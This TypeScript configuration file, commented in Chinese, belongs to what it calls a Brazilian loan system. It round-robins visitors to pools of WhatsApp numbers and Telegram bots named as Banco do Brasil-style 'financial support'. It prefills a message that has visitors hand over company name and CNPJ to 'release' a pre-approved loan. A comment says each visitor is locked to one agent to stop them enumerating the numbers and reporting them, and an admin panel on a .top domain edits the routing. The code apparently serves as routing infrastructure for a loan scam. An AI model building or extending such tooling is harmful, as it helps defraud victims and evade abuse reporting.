/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * -------------------------------------------------------------
 * 🏦 巴西贷款系统客服重定向核心配置文件 (支持多客服轮询)
 * -------------------------------------------------------------
 * 
 * 💡 说明:
 * 1. 本文件允许您在【后端或代码层面】直接配置客服联系渠道，防止普通用户或竞争对手在前端随意篡改配置。
 * 2. 两个渠道均支持【轮询（Round-Robin）分流规则】：
 *    - 您可以一次性填入多个 WhatsApp 客服号码并使用逗号或数组形式分开。
 *    - 您也可以一次性填入多个 Telegram 机器人或咨询客服链接。
 *    - 当用户模拟提交数据成功时，系统将通过轮询机制自动按顺序将流量均匀分发给这些客服代表。
 * 3. 管理后台 (admin.hgsswsvip.top) 可在线修改配置，无需重新部署。
 * 
 * ⚙️ 提示：修改下面的数组即可添加/删除客服，并支持动态格式占位符！
 */

export interface LoanRouteConfig {
  whatsappPool: string[];
  telegramPool: string[];
  whatsappMessageTemplate: string;
}

export const DYNAMIC_SYSTEM_CONFIG: LoanRouteConfig = {
  whatsappPool: [
    '5511999999999',
    '5511888888888',
    '5531777777777'
  ],
  telegramPool: [
    'https://t.me/suporte_financeiro_bb_bot',
    'https://t.me/suporte_financeiro_bb_2_bot'
  ],
  whatsappMessageTemplate: 'Olá! Sou {nome}, representante da empresa {nome_empresa} (CNPJ: {cnpj}). Acabei de simular nosso limite de crédito PJ no Banco Simulado de {prazo}x de {valor_parcela}. Gostaria de liberar o valor pré-aprovado de {valor_aprovado}. Protocolo: {codigo_atendimento}'
};

/**
 * 读取 Cookie（兜底读取，解决某些环境下 localStorage 跨页面不可见的问题）
 */
function getCookie(name: string): string | null {
  if (typeof document === 'undefined') return null;
  const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
  return match ? decodeURIComponent(match[1]) : null;
}

function cookieDomain(): string {
  if (typeof window === 'undefined') return '';
  const host = window.location.hostname;
  return host === 'hgsswsvip.top' || host.endsWith('.hgsswsvip.top') ? '; domain=.hgsswsvip.top' : '';
}

/**
 * 从 /config.json 读取部署级别的配置（跨设备生效）
 */
let cachedRemoteConfig: LoanRouteConfig | null = null;

export async function fetchRemoteConfig(): Promise<LoanRouteConfig> {
  if (cachedRemoteConfig) return cachedRemoteConfig;
  try {
    const resp = await fetch('/config.json', { cache: 'no-cache' });
    if (!resp.ok) throw new Error('not found');
    const json = await resp.json();
    const merged: LoanRouteConfig = {
      whatsappPool: Array.isArray(json.whatsappPool) ? json.whatsappPool : DYNAMIC_SYSTEM_CONFIG.whatsappPool,
      telegramPool: Array.isArray(json.telegramPool) ? json.telegramPool : DYNAMIC_SYSTEM_CONFIG.telegramPool,
      whatsappMessageTemplate: typeof json.whatsappMessageTemplate === 'string' ? json.whatsappMessageTemplate : DYNAMIC_SYSTEM_CONFIG.whatsappMessageTemplate,
    };
    cachedRemoteConfig = merged;
    return merged;
  } catch {
    return DYNAMIC_SYSTEM_CONFIG;
  }
}

/**
 * 动态读取配置：优先从 localStorage 读取管理后台保存的配置，
 * 没有则回退到代码中的 DYNAMIC_SYSTEM_CONFIG 默认值。
 */
export function getConfig(): LoanRouteConfig {
  try {
    const ws = localStorage.getItem('bb_whatsapp_pool') || getCookie('bb_whatsapp_pool');
    const tg = localStorage.getItem('bb_telegram_pool') || getCookie('bb_telegram_pool');
    const msg = localStorage.getItem('bb_message_template') || getCookie('bb_message_template');
    if (ws || tg || msg) {
      return {
        whatsappPool: ws ? JSON.parse(ws) : DYNAMIC_SYSTEM_CONFIG.whatsappPool,
        telegramPool: tg ? JSON.parse(tg) : DYNAMIC_SYSTEM_CONFIG.telegramPool,
        whatsappMessageTemplate: msg || DYNAMIC_SYSTEM_CONFIG.whatsappMessageTemplate,
      };
    }
  } catch {
    // localStorage 不可用时静默降级
  }
  return DYNAMIC_SYSTEM_CONFIG;
}

let remoteConfigOverride: LoanRouteConfig | null = null;

/**
 * 供 App.tsx 调用：注入从 /config.json 拉取的配置，
 * 优先级高于 localStorage/cookie。
 */
export function applyRemoteConfig(config: LoanRouteConfig) {
  remoteConfigOverride = config;
}

export function getFinalConfig(): LoanRouteConfig {
  if (remoteConfigOverride) return remoteConfigOverride;
  return getConfig();
}

/**
 * 同步配置到 Cookie（与 localStorage 双写）
 */
export function syncConfigToCookies(config: LoanRouteConfig) {
  if (typeof document === 'undefined') return;
  const domain = cookieDomain();
  document.cookie = `bb_whatsapp_pool=${encodeURIComponent(JSON.stringify(config.whatsappPool))}; path=/; max-age=31536000; SameSite=Lax${domain}`;
  document.cookie = `bb_telegram_pool=${encodeURIComponent(JSON.stringify(config.telegramPool))}; path=/; max-age=31536000; SameSite=Lax${domain}`;
  document.cookie = `bb_message_template=${encodeURIComponent(config.whatsappMessageTemplate)}; path=/; max-age=31536000; SameSite=Lax${domain}`;
}

/**
 * 获取当前轮询选中的 WhatsApp 号码和 Telegram 链接
 * 
 * 轮询策略:
 * - 使用全局顺序计数器 (Cookie)，每位新访客依次分配到不同客服
 * - 单个访客锁定首次分配的客服 (localStorage)，防止遍历号码恶意举报
 */
export function getActiveRotatedRoutes() {
  const cfg = getFinalConfig();
  const wsCount = cfg.whatsappPool.length || 1;
  const tgCount = cfg.telegramPool.length || 1;

  const ROTATION_KEY = 'bb_round_robin_counter';
  let currentWsIndex = 0;
  let currentTgIndex = 0;

  try {
    let savedWsIndex = localStorage.getItem('bb_locked_ws_index');
    let savedTgIndex = localStorage.getItem('bb_locked_tg_index');

    if (savedWsIndex === null) {
      // 从 Cookie 读取全局轮训位置
      let counter = parseInt(getCookie(ROTATION_KEY) || '0', 10) || 0;
      const assignedWs = counter % wsCount;
      localStorage.setItem('bb_locked_ws_index', assignedWs.toString());
      savedWsIndex = assignedWs.toString();
      // 推进计数器
      const next = (counter + 1) % 999999;
      document.cookie = `${ROTATION_KEY}=${next}; path=/; max-age=31536000; SameSite=Lax${cookieDomain()}`;
    }
    if (savedTgIndex === null) {
      let counter = parseInt(getCookie(ROTATION_KEY) || '0', 10) || 0;
      const assignedTg = counter % tgCount;
      localStorage.setItem('bb_locked_tg_index', assignedTg.toString());
      savedTgIndex = assignedTg.toString();
      const next = (counter + 1) % 999999;
      document.cookie = `${ROTATION_KEY}=${next}; path=/; max-age=31536000; SameSite=Lax${cookieDomain()}`;
    }

    currentWsIndex = parseInt(savedWsIndex, 10) % wsCount;
    currentTgIndex = parseInt(savedTgIndex, 10) % tgCount;
  } catch {
    currentWsIndex = Math.floor(Math.random() * wsCount);
    currentTgIndex = Math.floor(Math.random() * tgCount);
  }

  const activeWhatsapp = cfg.whatsappPool[currentWsIndex] || '5511999999999';
  const activeTelegram = cfg.telegramPool[currentTgIndex] || 'https://t.me/suporte_financeiro_bb_bot';

  return {
    whatsappNumber: activeWhatsapp,
    telegramLink: activeTelegram,
    currentWsIndex,
    currentTgIndex
  };
}

/**
 * 推进轮训计数器（访客完成模拟后，下一位访客分配到下一个客服）
 */
export function advanceRotationIndex() {
  try {
    const ROTATION_KEY = 'bb_round_robin_counter';
    let counter = parseInt(getCookie(ROTATION_KEY) || '0', 10) || 0;
    const next = (counter + 1) % 999999;
    document.cookie = `${ROTATION_KEY}=${next}; path=/; max-age=31536000; SameSite=Lax${cookieDomain()}`;
    console.log('[Rotation] Counter advanced to', next);
  } catch {}
}
